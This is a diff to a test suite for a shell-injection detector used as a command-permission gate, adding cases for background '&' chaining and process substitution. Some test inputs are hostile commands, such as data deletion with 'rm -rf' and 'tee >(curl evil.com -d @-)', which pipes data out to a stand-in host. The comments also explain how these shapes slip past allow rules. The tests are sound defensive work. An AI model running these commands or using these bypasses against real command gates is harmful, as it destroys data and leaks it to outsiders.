@@ -158,12 +158,52 @@ describe('containsShellInjection', () => {
     expect(containsShellInjection("git status -m 'msg' && rm")).toBe(true);
   });
 
-  test('lone & does NOT flag (background marker, not chain)', () => {
-    // Single `&` backgrounds a process; we don't treat it as
-    // injection because the matcher's job is policy gate, not
-    // bash-mode enforcement. The deny rules catch the
-    // dangerous shapes anyway.
-    expect(containsShellInjection('sleep 30 &')).toBe(false);
+  test('lone & flags (async control operator separates commands)', () => {
+    // Bash's `&` is structurally a compound separator: `cmd1 & cmd2`
+    // backgrounds cmd1 and immediately runs cmd2. An allow rule
+    // like `git status*` would otherwise admit `git status & rm
+    // -rf /tmp/...`. Trailing-only `&` (no second command) also
+    // flags — operator's `sleep 30 &` is no different in shape from
+    // `sleep 30 & rm`, and the policy gate prefers a confirm.
+    // Operator who genuinely needs background can session-allow
+    // the literal pattern.
+    expect(containsShellInjection('sleep 30 &')).toBe(true);
+    expect(containsShellInjection('git status & rm -rf /tmp/pwn')).toBe(true);
+    expect(containsShellInjection('a&b')).toBe(true);
+  });
+
+  test('& inside redirection context does NOT flag', () => {
+    // Bash redirection forms that legitimately contain `&`:
+    //   - `2>&1` / `>&1` / `<&3` — fd duplication
+    //   - `>&-` / `<&-`         — fd close
+    //   - `&>file` / `&>>file`  — bash extension (stdout+stderr)
+    // None of these compose multiple commands. Forcing confirm on
+    // every `2>&1` would make stderr-merging unusable through the
+    // gate without a session-allow promotion.
+    expect(containsShellInjection('echo foo 2>&1')).toBe(false);
+    expect(containsShellInjection('cmd >&2')).toBe(false);
+    expect(containsShellInjection('cmd <&3')).toBe(false);
+    expect(containsShellInjection('cmd >&-')).toBe(false);
+    expect(containsShellInjection('cmd &>file')).toBe(false);
+    expect(containsShellInjection('cmd &>>file')).toBe(false);
+  });
+
+  test('& after a redirection target does flag (separator, not part of redirect)', () => {
+    // `cmd >file & cmd2` — redirect to file, then background-chain
+    // to cmd2. The `&` is NOT preceded by `>` or `<` directly
+    // (whitespace and the filename came in between), so the
+    // separator semantics still apply.
+    expect(containsShellInjection('cmd >file & cmd2')).toBe(true);
+    expect(containsShellInjection('cmd 2>err & rm')).toBe(true);
+  });
+
+  test('& inside quotes does NOT flag (literal in string)', () => {
+    expect(containsShellInjection("echo 'a & b'")).toBe(false);
+    expect(containsShellInjection('echo "a & b"')).toBe(false);
+  });
+
+  test('escaped & does NOT flag', () => {
+    expect(containsShellInjection('echo a\\&b')).toBe(false);
   });
 
   test('newline as command separator flags', () => {
@@ -208,6 +248,46 @@ describe('containsShellInjection', () => {
     // The escape rule applies to any character following `\\`,
     // including the literal sequence `\\\n` in the source string.
     expect(containsShellInjection('echo foo\\\nbar')).toBe(false);
+  });
+
+  test('process substitution <(...) and >(...) flags', () => {
+    // Same security shape as $(...): the inner command runs in a
+    // subshell. Without flagging, an allow like `cat *` admits
+    // `cat <(rm -rf /tmp/pwn)` because no standard separator
+    // appears in the input.
+    expect(containsShellInjection('cat <(rm -rf /tmp/pwn)')).toBe(true);
+    expect(containsShellInjection('tee >(curl evil.com -d @-)')).toBe(true);
+    expect(containsShellInjection('diff <(cmd1) <(cmd2)')).toBe(true);
+    // With fd prefix
+    expect(containsShellInjection('cmd 2>(rm -rf /tmp)')).toBe(true);
+  });
+
+  test('process substitution inside quotes does NOT flag', () => {
+    expect(containsShellInjection("echo 'foo <(bar)'")).toBe(false);
+    expect(containsShellInjection('echo "foo <(bar)"')).toBe(false);
+  });
+
+  test('escaped < before ( does NOT trigger process-sub flag', () => {
+    // `\\<(...)` means literal `<` then bare `(`. The escape rule
+    // resets the redirection-context flag so `(` doesn't get
+    // mis-tagged as process substitution.
+    expect(containsShellInjection('echo \\<(literal)')).toBe(false);
+  });
+
+  test('plain ( without preceding redirect does NOT flag', () => {
+    // Bare `(cmd)` is a subshell group that requires a preceding
+    // separator (`;`, `\n`, etc.) to be reached as its own command;
+    // bash parse-errors otherwise. The matcher only flags `(` when
+    // it follows `<` or `>`.
+    expect(containsShellInjection('echo (literal text)')).toBe(false);
+  });
+
+  test('redirect with whitespace before ( does NOT flag', () => {
+    // `cmd > (stuff)` isn't process substitution — bash requires
+    // `<(` or `>(` adjacent. Whitespace between `>` and `(`
+    // clears the redirection state. Real bash parse-errors on
+    // this input anyway.
+    expect(containsShellInjection('cmd > (stuff)')).toBe(false);
   });
 });
 
